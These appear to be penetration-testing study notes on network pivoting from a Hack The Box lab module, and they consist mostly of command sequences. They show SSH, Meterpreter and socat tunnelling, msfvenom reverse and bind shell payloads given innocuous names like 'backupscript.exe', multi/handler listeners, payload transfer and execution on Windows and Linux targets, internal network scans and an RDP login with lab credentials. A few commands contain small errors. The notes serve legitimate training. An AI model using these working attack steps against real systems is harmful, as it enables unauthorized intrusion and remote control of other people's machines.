## Dynamic/Local Port Forwarding with SSH and SOCKS Tunneling
**Local Port Forwarding**
![local port forwarding](https://academy.hackthebox.com/storage/modules/158/11.png)

**Dynamic Port Forwarding**
![dynamic port forwarding](https://academy.hackthebox.com/storage/modules/158/22.png)

```bash
#1- SSH Local Port Forwarding
# (open a port on the client, and forward it to a remote machine)
 # SSH can listen on our local host and forward a service on the remote host to our port
  # ATTACKER 127.0.0.1:1234 ======> MACHINE_01 127.0.0.1:3036

  # attack host (10.10.15.x) , target host (10.129.x.x) (ex.10.129.202.64)

  nmap -sT -p22,3306 10.129.202.64 # 22 ssh open, [3306] mysql close
  # port 3036 mysql hosted localy , we want access mysql from our attack host

  # Executing the Local Port Forward
  ssh -L 1234:localhost:3306 Machine_01@10.129.202.64 
  # Forward local port 1234 → target's localhost:3306
  
  # Confirming Port Forward with Netstat
  netstat -antp | grep 1234

  # Confirming Port Forward with Nmap
  nmap -v -sV -p1234 localhost
  
  # Forwarding Multiple Ports
  ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
------------------------------------------------------------------------------
#2- dynamic port forwarding
  # we can send packets to a remote network via a pivot host.
   # ATTACKER 127.0.0.1:9050 ===> MACHINE_01 ===> <IP>:<PORT>
  
  # attack host (10.10.15.x) , target host (10.129.x.x) & (172.16.x.x)
  #  Enabling Dynamic Port Forwarding with SSH
  ssh -D 9050 ubuntu@10.129.202.64
  tail -4 /etc/proxychains4.conf #=> socks4  127.0.0.1 9050

  # Using Nmap with Proxychains
  proxychains nmap -v -sn 172.16.5.1-200 # scan for alive hosts to pivot
  [!] # proxychains can handel only full TCP connect scan
  [!] # Windows Defender firewall blocks ICMP requests (traditional pings) by default
  proxychains nmap -v -Pn -sT 172.16.5.19 # enum , 3389 open (rdp)

  ## Using Metasploit with Proxychains
  proxychains msfconsole
  use scanner/rdp/rdp_scanner 
  set rhosts 172.16.5.19
  run #=> Detected RDP on 172.16.5.19:3389

  # Using xfreerdp with Proxychains
  proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Remote Port Forwarding
**Remote port forwarding**
![](https://academy.hackthebox.com/storage/modules/158/44.png)
```bash
#2- Remote/Reverse Port Forwarding
# (open a port on the server, and forward it to client)
 # we want get reverse shell on the MACHINE 02 via pivot host (MACHINE 01)
 # Attacker(0.0.0.0:8000)<==MACHINE_01(172.16.5.x)<==MACHINE_02(172.16.5.x)

 # Creating a Windows Payload with msfvenom
 msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 # Configuring & Starting the multi/handler
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set lhost 0.0.0.0
 set lport 8000
 run  
 
 # Transferring Payload to Pivot Host
 scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

 # Starting Python3 Webserver on Pivot Host
 python3 -m http.server 8123 

 # Downloading Payload on the Windows Target
 Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

 # Remote Port Forwarding
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN 

 ./shell.exe # exute the shell on the windows target
 # we will get the  Meterpreter Session Established

```
##  Meterpreter Tunneling & Port Forwarding
```bash
  # create a pivot with our Meterpreter session without relying on SSH port forwarding
  # ATTACKER (10.10.14.18) ===> MACHINE_01(10.10.x.x & 172.16.5.x)

  ## Creating Payload for Ubuntu Pivot Host
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob 

  use exploit/multi/handler # Configuring & Starting the multi/handler
  set lhost 0.0.0.0
  set lport 8080
  run 
  scp backupjob ubuntu@<ipAddressofTarget>:~/ #Transferring Payload to Pivot Host

  chmod +x backupjob ; ./backupjob # Executing the Payload on the Pivot Host

  # we will get  Meterpreter Session Establishment 
  ## Ping Sweep
  run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 

  ## Ping Sweep For Loop on Linux Pivot Hosts
  for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

  ## Ping Sweep For Loop Using CMD
  for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

  ## Ping Sweep Using PowerShell
  1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

  # There could be scenarios when a host's firewall blocks ping (ICMP)
-------------------------------------------------------------------------------
## Configuring MSF's SOCKS Proxy (for dynamic port forwarding)
  #  start a listener on port 9050 and route all the traffic received via our Meterpreter session.
  use auxiliary/server/socks_proxy
  set SRVPORT 9050
  set SRVHOST 0.0.0.0
  set version 4a
  run
  # Confirming Proxy Server is Running
  jobs # => 0 Auxiliary: server/socks_proxy

# configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host.

  # Adding a Line to proxychains.conf if Needed
  socks4  127.0.0.1 9050
  [!] # Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

  # Creating Routes with AutoRoute
  use post/multi/manage/autoroute
  set SESSION 1
  set SUBNET 172.16.5.0
  run

  # or we can run autoroute 
  meterpreter > run autoroute -s 172.16.5.0/23 # from the meterpreter 
  route add 172.16.5.0 255.255.254.0 <session_id> # from msfconsole


  # Listing Active Routes with AutoRoute
  meterpreter > run autoroute -p # from meterpreter
  route print # from msfconsole
  
  # Testing Proxy & Routing Functionality
  proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
--------------------------------------------------------------------------------
## Port Forwarding
  help portfwd # options
  # local port forwarding 
      meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19 
      xfreerdp /v:localhost:3300 /u:victor /p:pass@123 #  Connecting to Windows Target through localhost
     # check the connection established 
     netstat -antp # 127.0.0.1:54652  127.0.0.1:3300 ESTABLISHED 4075/xfreerdp 
  
## reverse port forwarding 
  meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 

  # Configuring & Starting multi/handler
  bg 
  set payload windows/x64/meterpreter/reverse_tcp
  set LPORT 8081
  set LHOST 0.0.0.0  
  run

  ## Generating the Windows Payload
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
  
  # execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server. 
```
## Socat Redirection with a Reverse Shell
```bash
# Socat Redirection : remote port forwarding without ssh auth 
# HACKER: 10.129.202.64, M1:10.129.202.65|172.X.X.1 , M2:172.X.X.2
# (HACKER:80)<==[socket_redirection](<M1>:8080)<==(<M2>)

## on Machine_2 (pivot host)
socat TCP4-LISTEN:8080,fork TCP4:<HACKER-IP>:80  # Starting Socat Listener

## on our attacker host
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<M1-IP> -f exe -o backupscript.exe LPORT=8080 
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

## on M3 (compromised host we wan access)
.\backupscript.exe # excute the payload
```
## Socat Redirection with a Bind Shell
```bash
# HACKER: 10.129.202.64, M1:10.129.202.65|172.X.X.1 , M2:172.X.X.2
# (HACKER:80)==>[socket_redirection](<M1>:8080)==>(<M2>:8443)

# On machine_2 (pivot host)
socat TCP4-LISTEN:8080,fork TCP4:<M2-IP>:8443

# on Attacker host (hcaker)
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <M1-IP>
set LPORT 8080
run

# On M2 (machine we want access)
.\backupjob.exe
```